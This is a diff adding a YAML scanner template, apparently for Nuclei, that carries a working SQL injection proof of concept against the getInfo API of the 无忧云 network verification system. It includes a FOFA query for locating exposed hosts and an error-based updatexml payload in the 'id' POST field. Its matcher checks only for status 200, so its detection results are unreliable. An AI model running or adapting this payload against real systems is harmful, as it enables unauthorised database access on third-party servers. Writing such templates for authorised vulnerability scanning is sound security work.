@@ -1,0 +1,42 @@
+id: poc-kcd7i53ltld7xl5g
+info:
+  name: 无忧云网络验证系统 getInfo接口 SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kcd7i53ltld7xl5g'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kcd7i53ltld7xl5g
+    fofa: body="zhuya/js/base.js"
+http:
+- raw:
+  - 'POST /index.php/api/Software/getInfo HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    data=123456&id=1 and updatexml(1,concat(0x7e,md5(123),0x7e),1)
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    3d505516e0c197
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
